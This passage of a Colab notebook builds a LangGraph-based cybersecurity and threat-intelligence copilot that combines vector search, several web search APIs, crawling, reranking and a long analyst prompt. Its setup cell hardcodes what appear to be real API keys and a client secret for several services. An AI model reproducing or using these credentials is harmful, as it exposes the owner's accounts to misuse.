{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "machine_shape": "hm",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/KaifAhmad1/code-test/blob/main/Langgraph_Agentic_RAG_Cyber_AI_Copilot.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### **Cyber AI Copilot for Security and Intelligence Domain**"
      ],
      "metadata": {
        "id": "M0rt8qzmxyyR"
      }
    },
    {
      "cell_type": "code",
      "execution_count": 12,
      "metadata": {
        "id": "Wzih_tgLwXK6",
        "outputId": "aad05451-69a4-44cd-c3ec-0dea025bfae0",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "[LOG] Welcome to the Crawl4AI Model Downloader!\n",
            "[LOG] This script will download all the models required for Crawl4AI.\n",
            "[LOG] Downloading text classifier...\n",
            "2024-11-26 06:55:06.935636: E external/local_xla/xla/stream_executor/cuda/cuda_fft.cc:485] Unable to register cuFFT factory: Attempting to register factory for plugin cuFFT when one has already been registered\n",
            "2024-11-26 06:55:06.976573: E external/local_xla/xla/stream_executor/cuda/cuda_dnn.cc:8454] Unable to register cuDNN factory: Attempting to register factory for plugin cuDNN when one has already been registered\n",
            "2024-11-26 06:55:06.987048: E external/local_xla/xla/stream_executor/cuda/cuda_blas.cc:1452] Unable to register cuBLAS factory: Attempting to register factory for plugin cuBLAS when one has already been registered\n",
            "2024-11-26 06:55:08.597931: W tensorflow/compiler/tf2tensorrt/utils/py_utils.cc:38] TF-TRT Warning: Could not find TensorRT\n",
            "INFO:numexpr.utils:NumExpr defaulting to 2 threads.\n",
            "[LOG] Text classifier loaded on cpu\n",
            "[LOG] Downloading custom NLTK Punkt model...\n",
            "[LOG] ✅ All models downloaded successfully.\n",
            "Playwright Host validation warning: \n",
            "╔══════════════════════════════════════════════════════╗\n",
            "║ Host system is missing dependencies to run browsers. ║\n",
            "║ Missing libraries:                                   ║\n",
            "║     libwoff2dec.so.1.0.2                             ║\n",
            "║     libgstgl-1.0.so.0                                ║\n",
            "║     libgstcodecparsers-1.0.so.0                      ║\n",
            "║     libharfbuzz-icu.so.0                             ║\n",
            "║     libenchant-2.so.2                                ║\n",
            "║     libsecret-1.so.0                                 ║\n",
            "║     libhyphen.so.0                                   ║\n",
            "║     libmanette-0.2.so.0                              ║\n",
            "╚══════════════════════════════════════════════════════╝\n",
            "    at validateDependenciesLinux (/usr/local/lib/python3.10/dist-packages/playwright/driver/package/lib/server/registry/dependencies.js:216:9)\n",
            "    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)\n",
            "    at async Registry._validateHostRequirements (/usr/local/lib/python3.10/dist-packages/playwright/driver/package/lib/server/registry/index.js:626:43)\n",
            "    at async Registry._validateHostRequirementsForExecutableIfNeeded (/usr/local/lib/python3.10/dist-packages/playwright/driver/package/lib/server/registry/index.js:724:7)\n",
            "    at async Registry.validateHostRequirementsForExecutablesIfNeeded (/usr/local/lib/python3.10/dist-packages/playwright/driver/package/lib/server/registry/index.js:713:43)\n",
            "    at async t.<anonymous> (/usr/local/lib/python3.10/dist-packages/playwright/driver/package/lib/cli/program.js:119:7)\n"
          ]
        }
      ],
      "source": [
        "# Import necessary packages\n",
        "!pip install --upgrade --quiet sentence-transformers langchain langchain-groq langchain-pinecone langchain_cohere\n",
        "!pip install --quiet -U \"langchain-community>=0.2.16\" langchain-exa langchain-google-community goose3 crawl4ai[all]\n",
        "!pip install --upgrade --quiet faiss-cpu langchain_cohere\n",
        "!pip install -qU langgraph\n",
        "!crawl4ai-download-models\n",
        "!playwright install"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import os\n",
        "from typing import List, Dict, Any, Optional, TypedDict\n",
        "from pydantic import BaseModel\n",
        "from langchain_groq import ChatGroq\n",
        "from langchain_pinecone import PineconeVectorStore\n",
        "from pinecone import Pinecone\n",
        "from langchain_community.embeddings import HuggingFaceBgeEmbeddings\n",
        "from langchain.prompts import ChatPromptTemplate\n",
        "from langchain.chains import LLMChain\n",
        "from langchain_community.utilities import GoogleSerperAPIWrapper\n",
        "from langchain_community.tools import TavilySearchResults\n",
        "from langchain_google_community import GoogleSearchAPIWrapper\n",
        "from exa_py import Exa\n",
        "from dotenv import load_dotenv\n",
        "from langchain_core.tools import tool\n",
        "from datetime import datetime, timedelta\n",
        "import pytz\n",
        "from IPython.display import Image, display\n",
        "import getpass\n",
        "from langchain.schema import HumanMessage, SystemMessage, AIMessage\n",
        "import asyncio\n",
        "import nest_asyncio\n",
        "from crawl4ai import AsyncWebCrawler\n",
        "from crawl4ai.extraction_strategy import JsonCssExtractionStrategy\n",
        "import json\n",
        "from langchain_cohere import CohereRerank\n",
        "from langchain_community.llms import Cohere\n",
        "from langchain.retrievers.contextual_compression import ContextualCompressionRetriever\n",
        "from sklearn.metrics.pairwise import cosine_similarity\n",
        "import logging\n",
        "import re\n",
        "\n",
        "# Apply nest_asyncio to allow nested event loops\n",
        "nest_asyncio.apply()\n",
        "\n",
        "# Load environment variables\n",
        "load_dotenv()\n",
        "\n",
        "# API Keys (hidden for security purposes)\n",
        "GROQ_API_KEY = getpass.getpass(\"Enter your Groq API key: \")\n",
        "PINECONE_API_KEY = \"8e15b925-3b96-497d-b20a-08d308782b83\"\n",
        "PINECONE_ENVIRONMENT = \"us-east-1\"\n",
        "ASKNEWS_CLIENT_ID = \"a0de4609-b760-4c83-9609-5c04d7743b84\"\n",
        "ASKNEWS_CLIENT_SECRET = \"D5Mlhkztk4TcW24diUgcW0FA2w\"\n",
        "SERPER_API_KEY = \"d8e815ef6caa94dbef7b977a0ea7d505b43a5a06\"\n",
        "EXA_API_KEY = \"953b5801-11be-4b37-a313-f8df8f37027c\"\n",
        "GOOGLE_API_KEY=\"AIzaSyBIQo9X6acoBazBfte9jF9Pl0QEZ9oe8pk\"\n",
        "GOOGLE_CSE_ID=\"63053004a7e2445c3\"\n",
        "Tavily_API_KEY=\"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\"\n",
        "FIRECRAWL_API_KEY = \"fc-9c7bf92d1db44ae1a34f9dc56a6031e6\"\n",
        "COHERE_API_KEY = \"7e9js19mjC1pb3dNHKg012u6J9LRl8614KFL4ZmL\"\n",
        "\n",
        "# Set environment variables for Search Tools\n",
        "os.environ[\"GROQ_API_KEY\"] = GROQ_API_KEY\n",
        "os.environ[\"ASKNEWS_CLIENT_ID\"] = ASKNEWS_CLIENT_ID\n",
        "os.environ[\"ASKNEWS_CLIENT_SECRET\"] = ASKNEWS_CLIENT_SECRET\n",
        "os.environ[\"SERPER_API_KEY\"] = SERPER_API_KEY\n",
        "os.environ[\"EXA_API_KEY\"] = EXA_API_KEY\n",
        "os.environ[\"GOOGLE_API_KEY\"] = GOOGLE_API_KEY\n",
        "os.environ[\"GOOGLE_CSE_ID\"] = GOOGLE_CSE_ID\n",
        "os.environ[\"TAVILY_API_KEY\"] = Tavily_API_KEY\n",
        "os.environ[\"FIRECRAWL_API_KEY\"] = FIRECRAWL_API_KEY\n",
        "os.environ[\"COHERE_API_KEY\"] = COHERE_API_KEY"
      ],
      "metadata": {
        "id": "FY2ZeXgvxMxp",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "3d110cb7-a485-4b2c-d596-ae992deae9f8"
      },
      "execution_count": 13,
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Enter your Groq API key: ··········\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Initialize the Groq model\n",
        "llm = ChatGroq(\n",
        "    model=\"llama-3.2-3b-preview\",\n",
        "    temperature=0,\n",
        "    max_tokens=None,\n",
        "    timeout=None,\n",
        "    max_retries=2,\n",
        ")\n",
        "\n",
        "# Initialize the embeddings\n",
        "embeddings = HuggingFaceBgeEmbeddings(\n",
        "    model_name=\"BAAI/bge-small-en\",\n",
        "    model_kwargs={\"device\": \"cpu\"},\n",
        "    encode_kwargs={\"normalize_embeddings\": True}\n",
        ")\n",
        "\n",
        "# Initialize Pinecone and vector store\n",
        "pc = Pinecone(api_key=PINECONE_API_KEY, environment=PINECONE_ENVIRONMENT)\n",
        "pinecone_index = pc.Index(\"new-cyber-search\")\n",
        "vector_store = PineconeVectorStore(index=pinecone_index, embedding=embeddings)\n",
        "\n",
        "# Initialize search tools\n",
        "google_serper = GoogleSerperAPIWrapper()\n",
        "tavily_search = TavilySearchResults(\n",
        "    max_results=5,\n",
        "    search_depth=\"advanced\",\n",
        "    include_answer=True,\n",
        "    include_raw_content=True,\n",
        "    include_images=True,\n",
        ")\n",
        "google_search = GoogleSearchAPIWrapper()\n",
        "exa = Exa(api_key=EXA_API_KEY)\n",
        "\n",
        "# Initialize Cohere Reranker\n",
        "compressor = CohereRerank(model=\"rerank-english-v3.0\")\n",
        "# Define the retriever\n",
        "retriever = vector_store.as_retriever()\n",
        "# Initialize ContextualCompressionRetriever\n",
        "compression_retriever = ContextualCompressionRetriever(\n",
        "    base_compressor=compressor, base_retriever=retriever\n",
        ")"
      ],
      "metadata": {
        "id": "XxTld11_xT0d"
      },
      "execution_count": 14,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "class AgentState(TypedDict):\n",
        "    messages: List[Dict[str, str]]\n",
        "    memory: Optional[Dict[str, Any]]\n",
        "\n",
        "class SearchResult(BaseModel):\n",
        "    source: str\n",
        "    title: str\n",
        "    snippet: str\n",
        "    url: str\n",
        "    date: Optional[str]\n",
        "    media: Optional[List[str]] = []\n",
        "    media_content: Optional[List[Dict[str, str]]] = []\n",
        "    links: Optional[List[str]] = []\n",
        "    source_weight: Optional[float] = None\n",
        "    source_name: Optional[str] = None\n",
        "    final_score: Optional[float] = None\n",
        "\n",
        "class SearchResponse(BaseModel):\n",
        "    results: List[SearchResult]\n",
        "\n",
        "def parse_date(date_str: Optional[str]) -> Optional[datetime]:\n",
        "    if not date_str:\n",
        "        return None\n",
        "    try:\n",
        "        return datetime.fromisoformat(date_str.replace('Z', '+00:00'))\n",
        "    except ValueError:\n",
        "        try:\n",
        "            return datetime.strptime(date_str, \"%Y-%m-%d\")\n",
        "        except ValueError:\n",
        "            return None"
      ],
      "metadata": {
        "id": "rnQiDPU8xddo"
      },
      "execution_count": 15,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def vector_search(query: str) -> List[SearchResult]:\n",
        "    results = vector_store.similarity_search(query, k=5)\n",
        "    return [\n",
        "        SearchResult(\n",
        "            source=\"Vector Search\",\n",
        "            title=f\"Result {i+1}\",\n",
        "            snippet=doc.page_content,\n",
        "            url=doc.metadata.get(\"source\", \"No URL\"),\n",
        "            date=doc.metadata.get(\"date\")\n",
        "        ) for i, doc in enumerate(results)\n",
        "    ]\n",
        "\n",
        "def google_serper_search(query: str) -> List[SearchResult]:\n",
        "    results = google_serper.results(query)\n",
        "    return [\n",
        "        SearchResult(\n",
        "            source=\"Google Serper\",\n",
        "            title=result.get(\"title\", \"No title\"),\n",
        "            snippet=result.get(\"snippet\", \"No snippet\"),\n",
        "            url=result.get(\"link\", \"No link\"),\n",
        "            date=result.get(\"date\")\n",
        "        ) for result in results.get(\"organic\", [])\n",
        "    ]\n",
        "\n",
        "@tool\n",
        "def search_and_contents(query: str):\n",
        "    \"\"\"Search for webpages based on the query and retrieve their contents.\"\"\"\n",
        "    return exa.search_and_contents(\n",
        "        query, use_autoprompt=True, num_results=5, text=True, highlights=True\n",
        "    )\n",
        "\n",
        "def exa_search(query: str) -> List[SearchResult]:\n",
        "    try:\n",
        "        print(f\"DEBUG: Starting Exa Search with query: {query}\")\n",
        "        response = search_and_contents(query)\n",
        "        print(f\"DEBUG: Raw results from Exa Search: {response}\")\n",
        "\n",
        "        if not isinstance(response, SearchResponse):\n",
        "            print(f\"DEBUG: Exa Search results are not a SearchResponse. Type: {type(response)}\")\n",
        "            return []\n",
        "\n",
        "        results = response.results  # Extract the list of results from the SearchResponse object\n",
        "\n",
        "        search_results = [\n",
        "            SearchResult(\n",
        "                source=\"Exa Search\",\n",
        "                title=result.get(\"title\", \"No title\"),\n",
        "                snippet=result.get(\"snippet\", \"No snippet\"),\n",
        "                url=result.get(\"link\", \"No link\"),\n",
        "                date=result.get(\"date\")\n",
        "            ) for result in results\n",
        "        ]\n",
        "\n",
        "        print(f\"DEBUG: Processed Exa Search results: {search_results}\")\n",
        "        return search_results\n",
        "    except Exception as e:\n",
        "        print(f\"ERROR in Exa Search: {str(e)}\")\n",
        "        return []\n",
        "\n",
        "# Tavily search tool\n",
        "tavily_tool = TavilySearchResults(\n",
        "    max_results=5,\n",
        "    search_depth=\"advanced\",\n",
        "    include_answer=True,\n",
        "    include_raw_content=True,\n",
        "    include_images=True,\n",
        ")\n",
        "\n",
        "def tavily_search(query: str) -> List[SearchResult]:\n",
        "    try:\n",
        "        results = tavily_tool.invoke({\"query\": query})\n",
        "        return [\n",
        "            SearchResult(\n",
        "                source=\"Tavily Search\",\n",
        "                title=result.get(\"title\", \"No title\"),\n",
        "                snippet=result.get(\"content\", \"No snippet\"),\n",
        "                url=result.get(\"url\", \"No link\"),\n",
        "                date=result.get(\"date\")\n",
        "            ) for result in results\n",
        "        ]\n",
        "    except Exception as e:\n",
        "        print(f\"ERROR in Tavily Search: {str(e)}\")\n",
        "        return []\n",
        "\n",
        "# New Google Programmable Search function\n",
        "def google_programmable_search(query: str) -> List[SearchResult]:\n",
        "    try:\n",
        "        results = google_search.results(query, num_results=5)\n",
        "        return [\n",
        "            SearchResult(\n",
        "                source=\"Google Programmable Search\",\n",
        "                title=result.get(\"title\", \"No title\"),\n",
        "                snippet=result.get(\"snippet\", \"No snippet\"),\n",
        "                url=result.get(\"link\", \"No link\"),\n",
        "                date=result.get(\"date\")\n",
        "            ) for result in results\n",
        "        ]\n",
        "    except Exception as e:\n",
        "        print(f\"ERROR in Google Programmable Search: {str(e)}\")\n",
        "        return []\n",
        "\n",
        "# Google Serper Image Search\n",
        "def google_serper_image_search(query: str) -> List[SearchResult]:\n",
        "    search_images = GoogleSerperAPIWrapper(type=\"images\")\n",
        "    results_images = search_images.results(query)\n",
        "    return [\n",
        "        SearchResult(\n",
        "            source=\"Google Serper Image Search\",\n",
        "            title=result.get(\"title\", \"No title\"),\n",
        "            snippet=result.get(\"snippet\", \"No snippet\"),\n",
        "            url=result.get(\"imageUrl\", \"No link\"),\n",
        "            date=None,\n",
        "            media=[result.get(\"imageUrl\", \"No link\")]\n",
        "        ) for result in results_images.get(\"images\", [])\n",
        "    ]\n",
        "\n",
        "# Google Programmable Image Search\n",
        "def google_programmable_image_search(query: str) -> List[SearchResult]:\n",
        "    try:\n",
        "        results = google_search.results(query + \" image\", num_results=5)\n",
        "        return [\n",
        "            SearchResult(\n",
        "                source=\"Google Programmable Image Search\",\n",
        "                title=result.get(\"title\", \"No title\"),\n",
        "                snippet=result.get(\"snippet\", \"No snippet\"),\n",
        "                url=result.get(\"link\", \"No link\"),\n",
        "                date=None,\n",
        "                media=[result.get(\"link\", \"No link\")]\n",
        "            ) for result in results\n",
        "        ]\n",
        "    except Exception as e:\n",
        "        print(f\"ERROR in Google Programmable Image Search: {str(e)}\")\n",
        "        return []\n",
        "\n",
        "# Enhanced recency scoring using exponential decay\n",
        "def calculate_recency_score(date: Optional[datetime]) -> float:\n",
        "    if date is None:\n",
        "        return 0.0\n",
        "    current_date = datetime.now(pytz.utc)\n",
        "    days_old = (current_date - date).days\n",
        "    if days_old < 0:  # Future date\n",
        "        return 0.0\n",
        "    return 0.9 ** days_old  # Exponential decay with base 0.9\n",
        "\n",
        "# Enhanced source classification\n",
        "def classify_source(source: str) -> float:\n",
        "    if \"advisory\" in source.lower() or \"threat intelligence\" in source.lower():\n",
        "        return 1.0  # Highest weight for official security advisories and threat intelligence platforms\n",
        "    elif \"news\" in source.lower():\n",
        "        return 0.8  # High weight for news sources\n",
        "    elif \"blog\" in source.lower():\n",
        "        return 0.6  # Moderate weight for blogs\n",
        "    else:\n",
        "        return 0.5  # Default weight for other sources\n",
        "\n",
        "# Enhanced search query\n",
        "def enhance_search_query(query: str) -> str:\n",
        "    current_year = datetime.now().year\n",
        "    enhanced_query = f\"{query} 2024 OR {current_year} recent\"\n",
        "    return enhanced_query\n",
        "\n",
        "# Reranking function with semantic similarity and metadata scoring\n",
        "def rerank_results(query: str, results: List[SearchResult], state: AgentState) -> List[SearchResult]:\n",
        "    # Create embeddings for query and results\n",
        "    query_embedding = embeddings.embed_query(query)\n",
        "\n",
        "    # Combine snippets with crawled content for richer context\n",
        "    enhanced_results = []\n",
        "    for result in results:\n",
        "        # Get crawled content for this URL if available\n",
        "        crawled_content = \"\"\n",
        "        for m in state[\"messages\"]:\n",
        "            if m[\"role\"] == \"tool\" and \"crawled_results\" in m:\n",
        "                for cr in m[\"crawled_results\"]:\n",
        "                    if isinstance(cr, dict) and cr.get(\"url\") == result.url:\n",
        "                        crawled_content = cr.get(\"content\", \"\")\n",
        "                        break\n",
        "\n",
        "        # Combine snippet with crawled content\n",
        "        full_content = f\"{result.snippet}\\n{crawled_content}\"\n",
        "        content_embedding = embeddings.embed_query(full_content)\n",
        "\n",
        "        # Calculate semantic similarity\n",
        "        similarity = cosine_similarity(\n",
        "            [query_embedding],\n",
        "            [content_embedding]\n",
        "        )[0][0]\n",
        "\n",
        "        # Add metadata scoring (e.g., source weight, date)\n",
        "        metadata_score = result.source_weight or 0\n",
        "        date = parse_date(result.date)\n",
        "        date_score = calculate_recency_score(date)\n",
        "        final_score = similarity + metadata_score + date_score\n",
        "\n",
        "        enhanced_results.append((final_score, result))\n",
        "\n",
        "    # Sort by final score\n",
        "    enhanced_results.sort(reverse=True, key=lambda x: x[0])\n",
        "    return [result for _, result in enhanced_results]\n",
        "\n",
        "# Enhanced content extraction with media handling\n",
        "async def extract_content_from_url(url: str) -> Dict[str, Any]:\n",
        "    schema = {\n",
        "        \"name\": \"Enhanced Content Extractor\",\n",
        "        \"baseSelector\": \"body\",\n",
        "        \"fields\": [\n",
        "            {\n",
        "                \"name\": \"content\",\n",
        "                \"selector\": \"body\",\n",
        "                \"type\": \"text\",\n",
        "            },\n",
        "            {\n",
        "                \"name\": \"links\",\n",
        "                \"selector\": \"a[href]\",\n",
        "                \"type\": \"attribute\",\n",
        "                \"attribute\": \"href\",\n",
        "            },\n",
        "            {\n",
        "                \"name\": \"images\",\n",
        "                \"selector\": \"img[src]\",\n",
        "                \"type\": \"attribute\",\n",
        "                \"attribute\": \"src\",\n",
        "            },\n",
        "            {\n",
        "                \"name\": \"meta_description\",\n",
        "                \"selector\": \"meta[name='description']\",\n",
        "                \"type\": \"attribute\",\n",
        "                \"attribute\": \"content\",\n",
        "            },\n",
        "            {\n",
        "                \"name\": \"publication_date\",\n",
        "                \"selector\": [\n",
        "                    \"meta[property='article:published_time']\",\n",
        "                    \"time[datetime]\",\n",
        "                    \"meta[name='publicationDate']\"\n",
        "                ],\n",
        "                \"type\": \"attribute\",\n",
        "                \"attribute\": [\"content\", \"datetime\", \"content\"],\n",
        "            }\n",
        "        ],\n",
        "    }\n",
        "\n",
        "    extraction_strategy = JsonCssExtractionStrategy(schema, verbose=True)\n",
        "\n",
        "    async with AsyncWebCrawler(verbose=True) as crawler:\n",
        "        result = await crawler.arun(\n",
        "            url=url,\n",
        "            extraction_strategy=extraction_strategy,\n",
        "            bypass_cache=True,\n",
        "        )\n",
        "\n",
        "        if not result.success:\n",
        "            print(f\"ERROR: Failed to crawl the page {url}\")\n",
        "            return None\n",
        "\n",
        "        extracted_content = json.loads(result.extracted_content)\n",
        "\n",
        "        # Process and validate images\n",
        "        if \"images\" in extracted_content:\n",
        "            valid_images = []\n",
        "            for img_url in extracted_content[\"images\"]:\n",
        "                if is_valid_image_url(img_url):\n",
        "                    valid_images.append(img_url)\n",
        "            extracted_content[\"valid_images\"] = valid_images\n",
        "\n",
        "        return extracted_content\n",
        "\n",
        "def is_valid_image_url(url: str) -> bool:\n",
        "    \"\"\"Validate image URLs and filter out common web elements.\"\"\"\n",
        "    if not url:\n",
        "        return False\n",
        "\n",
        "    # Filter out common web elements\n",
        "    excluded_patterns = [\n",
        "        'favicon', 'logo', 'icon', 'sprite', 'pixel',\n",
        "        'tracking', 'advertisement', 'banner'\n",
        "    ]\n",
        "    return not any(pattern in url.lower() for pattern in excluded_patterns)\n",
        "\n",
        "# Enhanced search aggregation with deduplication and metadata scoring\n",
        "def aggregate_search_results(\n",
        "    query: str,\n",
        "    *args: List[SearchResult]\n",
        ") -> List[SearchResult]:\n",
        "\n",
        "    # Combine all results with metadata scoring\n",
        "    all_results = []\n",
        "    sources = ['vector', 'serper', 'exa', 'tavily', 'google', 'google_serper_image', 'google_programmable_image']\n",
        "    weights = [1.0, 0.9, 0.85, 0.8, 0.75, 0.7, 0.65]\n",
        "\n",
        "    for results, source, weight in zip(args, sources, weights):\n",
        "        all_results.extend([(result, source, weight, result.source_weight or 0, parse_date(result.date)) for result in results])\n",
        "\n",
        "    # Deduplicate results based on URL and calculate final score\n",
        "    seen_urls = set()\n",
        "    unique_results = []\n",
        "\n",
        "    for result, source, weight, source_weight, date in all_results:\n",
        "        if result.url not in seen_urls:\n",
        "            seen_urls.add(result.url)\n",
        "            # Add source and weight to result metadata\n",
        "            result.source_weight = source_weight\n",
        "            result.source_name = source\n",
        "            # Calculate final score based on weight, source_weight, and date\n",
        "            date_score = calculate_recency_score(date)\n",
        "            final_score = weight + source_weight + date_score\n",
        "            result.final_score = final_score\n",
        "            unique_results.append(result)\n",
        "\n",
        "    # Sort by final score\n",
        "    unique_results.sort(reverse=True, key=lambda x: x.final_score)\n",
        "    return unique_results"
      ],
      "metadata": {
        "id": "48JIG0EUJjqx"
      },
      "execution_count": 16,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Enhanced execute_searches function with improved concurrency and error handling\n",
        "async def execute_searches(state: AgentState) -> AgentState:\n",
        "    query = state[\"messages\"][-1][\"content\"]\n",
        "\n",
        "    # Enhance the search query\n",
        "    enhanced_query = enhance_search_query(query)\n",
        "\n",
        "    # Execute all searches in parallel with improved error handling\n",
        "    search_functions = [\n",
        "        vector_search,\n",
        "        google_serper_search,\n",
        "        exa_search,\n",
        "        tavily_search,\n",
        "        google_programmable_search,\n",
        "        google_serper_image_search,\n",
        "        google_programmable_image_search\n",
        "    ]\n",
        "    search_tasks = [asyncio.to_thread(search_func, enhanced_query) for search_func in search_functions]\n",
        "    search_results = await asyncio.gather(*search_tasks, return_exceptions=True)\n",
        "\n",
        "    # Handle exceptions and filter out failed searches\n",
        "    successful_results = []\n",
        "    for results in search_results:\n",
        "        if isinstance(results, Exception):\n",
        "            logging.error(f\"ERROR in search: {str(results)}\")\n",
        "        else:\n",
        "            successful_results.append(results)\n",
        "\n",
        "    # Aggregate and deduplicate results with metadata scoring\n",
        "    combined_results = aggregate_search_results(\n",
        "        enhanced_query, *successful_results\n",
        "    )\n",
        "\n",
        "    # Reranking with semantic similarity and metadata scoring\n",
        "    reranked_results = rerank_results(enhanced_query, combined_results, state)\n",
        "\n",
        "    # Extract URLs for crawling with improved concurrency\n",
        "    urls_to_crawl = [result.url for result in reranked_results[:5]]  # Limit to top 5\n",
        "    crawl_tasks = [extract_content_from_url(url) for url in urls_to_crawl]\n",
        "    crawled_results = await asyncio.gather(*crawl_tasks)\n",
        "\n",
        "    # Filter out None results and add to state\n",
        "    valid_crawled_results = [r for r in crawled_results if r is not None]\n",
        "\n",
        "    state[\"messages\"].append({\n",
        "        \"role\": \"tool\",\n",
        "        \"content\": \"Enhanced Search Results\",\n",
        "        \"results\": reranked_results,\n",
        "        \"crawled_results\": valid_crawled_results\n",
        "    })\n",
        "\n",
        "    return state\n",
        "\n",
        "def highlight_keywords(text: str, keywords: List[str]) -> str:\n",
        "    \"\"\"Highlight specific keywords in the text.\"\"\"\n",
        "    for keyword in keywords:\n",
        "        text = text.replace(keyword, f\"**{keyword}**\")\n",
        "    return text"
      ],
      "metadata": {
        "id": "iuF6b8-Wn1F_"
      },
      "execution_count": 17,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Enhanced response generation with better prompt engineering and media content handling\n",
        "def generate_response(state: AgentState) -> AgentState:\n",
        "    memory = state.get(\"memory\", {})\n",
        "    chat_history = memory.get(\"chat_history\", \"\")\n",
        "\n",
        "    search_results = next((m[\"results\"] for m in reversed(state[\"messages\"])\n",
        "                           if m[\"role\"] == \"tool\" and \"results\" in m), [])\n",
        "\n",
        "    crawled_results = next((m[\"crawled_results\"] for m in reversed(state[\"messages\"])\n",
        "                            if m[\"role\"] == \"tool\" and \"crawled_results\" in m), [])\n",
        "\n",
        "    print(\"Crawled Results:\", crawled_results)  # Add this line to inspect the crawled results\n",
        "\n",
        "    # Generate adaptive prompt based on the query and search results\n",
        "    prompt_template = \"\"\" You are an advanced AI copilot specializing in cybersecurity, intelligence analysis, and technical response. Your task is to synthesize, validate, and provide query-focused insights from diverse, verified data sources, delivering a response that combines precision, actionable intelligence, and situational awareness. Your analysis should be tailored to each unique query, maintaining accuracy and relevance throughout.\n",
        "\n",
        "    **ANALYSIS PROTOCOL** *(Structured in Phases for comprehensive evaluation)*:\n",
        "\n",
        "    1. **Source and Credibility Verification**:\n",
        "       - **Domain Reliability**: Prioritize high-authority cybersecurity, intelligence, and technical sources.\n",
        "       - **Timeliness Validation**: Confirm that the data is current and directly relevant to the specific query.\n",
        "       - **Cross-Reference Key Data Points**: Validate critical information by cross-referencing with multiple reputable sources.\n",
        "       - **Misinformation Detection**: Identify and disregard any unsupported claims, exaggerations, or potentially misleading data.\n",
        "\n",
        "    2. **Content Extraction and Relevance Filtering**:\n",
        "       - **Identify Core Data**: Extract essential information such as threat vectors, indicators, metrics, and statistics.\n",
        "       - **Pattern Recognition and Correlation**: Detect recurring themes, correlations, and trends across data sources.\n",
        "       - **Contextual Prioritization**:\n",
        "         - **Temporal Relevance**: Emphasize the most recent and impactful data.\n",
        "         - **Technical Depth**: Focus on technical details directly pertinent to the query context.\n",
        "         - **Query Alignment**: Rank findings by their relevance to the query and the user’s specific question.\n",
        "\n",
        "    3. **Visual and Media Analysis**:\n",
        "       - **Visual Verification**: Evaluate images, diagrams, and screenshots for technical relevance and accuracy.\n",
        "       - **Technical Indicator Extraction**: Identify critical data from visuals, including IP addresses, file hashes, or attack paths.\n",
        "       - **Text-Visual Correlation**: Cross-reference media content with textual data, emphasizing technical implications and alignment.\n",
        "\n",
        "    **ADAPTIVE RESPONSE STRUCTURE** *(Dynamic, based on query type)*:\n",
        "\n",
        "    1. **Executive Summary**:\n",
        "       - Provide a concise, high-level overview summarizing key findings, highlighting high-priority insights and recommendations.\n",
        "\n",
        "    2. **In-Depth Analysis**:\n",
        "       - **Key Findings**:\n",
        "         - A bullet-point list of critical discoveries, emerging threats, and significant events.\n",
        "         - Include specific metrics, trends, or any quantitative data directly relevant to the query.\n",
        "       - **Technical Breakdown**:\n",
        "         - Detail specific vulnerabilities, exploits, attack vectors, or system impacts.\n",
        "         - Address affected components and dependencies, along with any recommended remediation actions.\n",
        "       - **Contextual and Industry Impact**:\n",
        "         - Analyze sector-specific or industry-wide implications.\n",
        "         - Attribute threat actors, where identifiable, and connect tactics to established frameworks (e.g., MITRE ATT&CK).\n",
        "         - Draw connections to historical incidents or patterns for enhanced context.\n",
        "\n",
        "    3. **Most Recent Relevant Activities**:\n",
        "       - **Latest Developments**:\n",
        "         - Summarize the most recent activities, incidents, or updates directly related to the query.\n",
        "         - Describe new vulnerabilities, patches, or emerging threats impacting the cybersecurity landscape.\n",
        "       - **Immediate Implications**:\n",
        "         - Assess the direct impact of these recent developments on the query context.\n",
        "         - Suggest any immediate actions or mitigations needed in response to recent changes.\n",
        "\n",
        "    4. **Source Citations and Evidence**:\n",
        "       - Cite all findings with accuracy, using the [Source Name](URL) format to link major claims.\n",
        "       - For specific assertions, provide direct quote snippets with context.\n",
        "       - **Embedded Media References**: Link to relevant media (e.g., screenshots, diagrams) with brief descriptions.\n",
        "       - **Actionable Recommendations**:\n",
        "         - Offer precise, immediate actions and mitigation strategies.\n",
        "         - Outline relevant detection and prevention techniques pertinent to the identified threats.\n",
        "         - Suggest operational security measures for high-severity findings.\n",
        "\n",
        "    5. **Long-Term Forecast and Monitoring**:\n",
        "       - Discuss projected evolution in threat trends, actor tactics, or tool capabilities.\n",
        "       - Recommend specific trends or areas for ongoing monitoring and long-term response.\n",
        "\n",
        "    **SPECIALIZED QUERY HANDLING** *(Dynamic strategies based on context)*:\n",
        "\n",
        "    - **For Threat Intelligence Queries**:\n",
        "      - Extract Indicators of Compromise (IOCs) such as IPs, domains, and file hashes.\n",
        "      - Map findings to MITRE ATT&CK TTPs and assess behavior patterns of malware and threat actors.\n",
        "      - Document any identified Command and Control (C2) configurations.\n",
        "\n",
        "    - **For Vulnerability and Exploit Analysis**:\n",
        "      - Validate CVE details, including severity ratings, affected systems, and patch availability.\n",
        "      - Assess real-world exploitability, including any observed attacks or reports of active exploitation.\n",
        "\n",
        "    - **For Incident Response**:\n",
        "      - Construct a timeline of events, reconstructing points of compromise and attack paths.\n",
        "      - Provide clear recovery steps and immediate containment strategies.\n",
        "\n",
        "    - **For Trend Analysis**:\n",
        "      - Identify shifts in attack vectors, techniques, or actor capabilities, mapping against historical baselines.\n",
